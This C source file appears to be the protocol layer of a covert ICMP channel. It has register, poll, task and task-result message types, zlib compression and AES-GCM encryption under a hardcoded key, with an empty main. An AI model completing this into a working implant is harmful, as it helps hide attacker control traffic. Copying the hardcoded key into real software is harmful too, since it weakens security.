#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <endian.h>
#include <zlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <sys/socket.h>
#include <netinet/ip_icmp.h>
#include <poll.h>

#define MAX_PAYLOAD_SIZE 1400
#define MAX_CHUNK_SIZE 1300

#define MESSAGE_REGISTER 1
#define MESSAGE_POLL 2
#define MESSAGE_TASK 3
#define MESSAGE_TASK_RESULT 4
#define MESSAGE_ANNOUNCE_CHUNKED 5
#define MESSAGE_CHUNK 6
#define MESSAGE_ACK 7
#define MESSAGE_EMPTY 8

static const unsigned char ENCRYPTION_KEY[32] = {
	0x4e, 0xc9, 0x17, 0xa3, 0x58, 0xd2, 0x6b, 0xf0,
	0x91, 0x3a, 0xe5, 0x27, 0xc4, 0x88, 0x1d, 0x6a,
	0xf3, 0x0b, 0x59, 0xd8, 0x72, 0x41, 0xae, 0x96,
	0x05, 0xb7, 0xce, 0x23, 0xda, 0x64, 0x18, 0x9f
};

uint16_t calculate_checksum(const unsigned char *data, size_t length) {

	uint32_t checksum = 0;
	while (length >= 2) {
		checksum += ((uint32_t)data[0] << 8) | data[1];
		data += 2;
		length -= 2;
	}

	if (length == 1) {
		checksum += (uint32_t)data[0] << 8;
	}

	while (checksum >> 16) {
		checksum = (checksum & 0xffffu) + (checksum >> 16);
	}

	return (uint16_t)~checksum;

}

unsigned char *compress_encrypt(const unsigned char *message, size_t message_length, int compression_level, size_t *data_to_send_length) {

	uLongf compressed_length = compressBound((uLong)message_length);
	unsigned char *compressed_data = malloc(compressed_length);
	if (compress2(compressed_data, &compressed_length, message, (uLong)message_length, compression_level) != Z_OK) {
		free(compressed_data);
		*data_to_send_length = 0;
		return NULL;
	}

	unsigned char nonce[12];
	unsigned char authentication_tag[16];
	unsigned char *encrypted_data = malloc(compressed_length);
	RAND_bytes(nonce, sizeof(nonce));
	EVP_CIPHER_CTX *encryption_context = EVP_CIPHER_CTX_new();
	int encrypted_length = 0;
	int final_length = 0;
	EVP_EncryptInit_ex(encryption_context, EVP_aes_256_gcm(), NULL, ENCRYPTION_KEY, nonce);
	EVP_EncryptUpdate(encryption_context, encrypted_data, &encrypted_length, compressed_data, (int)compressed_length);
	EVP_EncryptFinal_ex(encryption_context, encrypted_data + encrypted_length, &final_length);
	encrypted_length += final_length;
	EVP_CIPHER_CTX_ctrl(encryption_context, EVP_CTRL_AEAD_GET_TAG, sizeof(authentication_tag), authentication_tag);
	EVP_CIPHER_CTX_free(encryption_context);

	size_t result_length = sizeof(nonce) + sizeof(authentication_tag) + (size_t)encrypted_length;
	unsigned char *data_to_send = malloc(result_length);
	memcpy(data_to_send, nonce, sizeof(nonce));
	memcpy(data_to_send + sizeof(nonce), authentication_tag, sizeof(authentication_tag));
	memcpy(data_to_send + sizeof(nonce) + sizeof(authentication_tag), encrypted_data, (size_t)encrypted_length);

	free(compressed_data);
	free(encrypted_data);

	*data_to_send_length = result_length;
	return data_to_send;

}

unsigned char *decrypt_uncompress(const unsigned char *received_data, size_t received_data_length, size_t *received_message_length) {

	unsigned char nonce[12];
	unsigned char authentication_tag[16];

	if (received_data_length < sizeof(nonce) + sizeof(authentication_tag)) {
		*received_message_length = 0;
		return NULL;
	}

	memcpy(nonce, received_data, sizeof(nonce));
	memcpy(authentication_tag, received_data + sizeof(nonce), sizeof(authentication_tag));

	int encrypted_length = (int)(received_data_length - sizeof(nonce) - sizeof(authentication_tag));
	unsigned char *decrypted_data = malloc((size_t)encrypted_length);
	EVP_CIPHER_CTX *decryption_context = EVP_CIPHER_CTX_new();
	int decrypted_length = 0;
	int final_decrypted_length = 0;
	EVP_DecryptInit_ex(decryption_context, EVP_aes_256_gcm(), NULL, ENCRYPTION_KEY, nonce);
	EVP_DecryptUpdate(decryption_context, decrypted_data, &decrypted_length, received_data + sizeof(nonce) + sizeof(authentication_tag), encrypted_length);
	EVP_CIPHER_CTX_ctrl(decryption_context, EVP_CTRL_AEAD_SET_TAG, sizeof(authentication_tag), authentication_tag);
	if (EVP_DecryptFinal_ex(decryption_context, decrypted_data + decrypted_length, &final_decrypted_length) <= 0) {
		EVP_CIPHER_CTX_free(decryption_context);
		free(decrypted_data);
		*received_message_length = 0;
		return NULL;
	}
	EVP_CIPHER_CTX_free(decryption_context);
	decrypted_length += final_decrypted_length;

	uLongf uncompressed_capacity = 4096;
	unsigned char *uncompressed_data = malloc(uncompressed_capacity);
	uLongf uncompressed_length = uncompressed_capacity;
	int status = uncompress(uncompressed_data, &uncompressed_length, decrypted_data, (uLong)decrypted_length);
	while (status == Z_BUF_ERROR) {
		uncompressed_capacity *= 2;
		uncompressed_data = realloc(uncompressed_data, uncompressed_capacity);
		uncompressed_length = uncompressed_capacity;
		status = uncompress(uncompressed_data, &uncompressed_length, decrypted_data, (uLong)decrypted_length);
	}

	free(decrypted_data);

	if (status != Z_OK) {
		free(uncompressed_data);
		*received_message_length = 0;
		return NULL;
	}

	*received_message_length = uncompressed_length;
	return uncompressed_data;

}

unsigned char *build_message(uint8_t message_type, uint64_t device_id, const unsigned char *message_body, size_t message_body_length, size_t *message_length) {

	size_t result_length = 1 + sizeof(device_id) + message_body_length;
	unsigned char *message = malloc(result_length);

	message[0] = message_type;
	uint64_t network_device_id = htobe64(device_id);
	memcpy(message + 1, &network_device_id, sizeof(network_device_id));

	if (message_body_length > 0) {
		memcpy(message + 1 + sizeof(network_device_id), message_body, message_body_length);
	}

	*message_length = result_length;
	return message;

}

int parse_message(const unsigned char *received_message, size_t received_message_length, uint8_t *received_message_type, uint64_t *device_id, unsigned char **received_message_body, size_t *received_message_body_length) {

	if (received_message_length < 1 + sizeof(uint64_t)) {
		return -1;
	}

	*received_message_type = received_message[0];

	uint64_t network_device_id;
	memcpy(&network_device_id, received_message + 1, sizeof(network_device_id));
	*device_id = be64toh(network_device_id);

	*received_message_body_length = received_message_length - 1 - sizeof(uint64_t);
	*received_message_body = malloc(*received_message_body_length + 1);
	memcpy(*received_message_body, received_message + 1 + sizeof(uint64_t), *received_message_body_length);
	(*received_message_body)[*received_message_body_length] = 0;

	return 0;

}

int main(){
	return 0;
}
